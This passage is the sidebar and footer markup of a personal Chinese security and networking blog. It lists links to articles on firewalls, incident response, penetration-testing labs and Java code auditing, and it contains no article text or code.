href="/categories/Network/%E5%8D%8E%E4%B8%BA%E9%98%B2%E7%81%AB%E5%A2%99/%E5%AE%9E%E9%AA%8C/" title="分类于 实验">实验</a></div><span><a href="/Network/%E5%8D%8E%E4%B8%BA%E9%98%B2%E7%81%AB%E5%A2%99/%E5%AE%9E%E9%AA%8C/%E9%98%B2%E7%81%AB%E5%A2%99%E6%99%BA%E8%83%BD%E9%80%89%E8%B7%AF/" title="防火墙智能选路">防火墙智能选路</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/PDCERF/" title="分类于 应急响应">应急响应</a> <i class="ic i-angle-right"></i> <a href="/categories/PDCERF/Windows%E5%BA%94%E6%80%A5%E7%AC%94%E8%AE%B0/" title="分类于 Windows应急笔记">Windows应急笔记</a></div><span><a href="/PDCERF/Windows%E5%AE%9E%E6%88%98%E7%AF%87/%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/" title="勒索病毒">勒索病毒</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/Other/011-%E5%8F%8D%E5%BC%B9shell/003-Bash%E7%8E%AF%E5%A2%83%E4%B8%8B%E5%8F%8D%E5%BC%B9UDP%E5%8D%8F%E8%AE%AEshell/" title="未命名">未命名</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/APT/" title="分类于 渗透测试">渗透测试</a> <i class="ic i-angle-right"></i> <a href="/categories/APT/%E9%9D%B6%E5%9C%BA/" title="分类于 靶场">靶场</a></div><span><a href="/APT/%E9%9D%B6%E5%9C%BAwp/%E9%9D%B6%E5%9C%BA/vulnhub/Doubletrouble-1/" title="Doubletrouble-1">Doubletrouble-1</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/APT/" title="分类于 渗透测试">渗透测试</a> <i class="ic i-angle-right"></i> <a href="/categories/APT/%E5%B7%A5%E5%85%B7/" title="分类于 工具">工具</a></div><span><a href="/APT/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/john/" title="john">john</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="分类于 代码审计">代码审计</a> <i class="ic i-angle-right"></i> <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/" title="分类于 Java安全基础">Java安全基础</a></div><span><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/" title="1. java类加载机制">1. java类加载机制</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Network/" title="分类于 网络">网络</a> <i class="ic i-angle-right"></i> <a href="/categories/Network/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/" title="分类于 网络基础">网络基础</a></div><span><a href="/Network/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/HCIA/%E4%BB%A5%E5%A4%AA%E7%BD%91%E4%BA%A4%E6%8D%A2%E5%9F%BA%E7%A1%80/" title="以太网交换基础">以太网交换基础</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Network/" title="分类于 网络">网络</a> <i class="ic i-angle-right"></i> <a href="/categories/Network/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/" title="分类于 网络基础">网络基础</a> <i class="ic i-angle-right"></i> <a href="/categories/Network/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/%E5%AE%9E%E9%AA%8C/" title="分类于 实验">实验</a></div><span><a href="/Network/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/%E5%AE%9E%E9%AA%8C/ACL/" title="ACL">ACL</a></span></li></ul></div><div><h2>最新评论</h2><ul class="leancloud-recent-comment"></ul></div></div><div class="status"><div class="copyright">&copy; 2010 – <span itemprop="copyrightYear">2024</span> <span class="with-love"><i class="ic i-sakura rotate"></i> </span><span class="author" itemprop="copyrightHolder">余星酒 @ 余星酒</span></div><div class="powered-by">基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL={path:"APT/免杀学习/shellcode/",favicon:{show:"（●´3｀●）やれやれだぜ",hide:"(´Д｀)大変だ！"},search:{placeholder:"文章搜索",empty:"关于 「 ${query} 」，什么也没搜到",stats:"${time} ms 内找到 ${hits} 条结果"},valine:!0,fancybox:!0,copyright:'复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',ignores:[function(e){return e.includes("#")},function(e){return new RegExp(LOCAL.path+"$").test(e)}]}</script><script src="https://cdn.polyfill.io/v2/polyfill.js"></script><script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script><script src="/js/app.js?v=0.2.5"></script></body></html><!-- rebuild by hrmmi -->
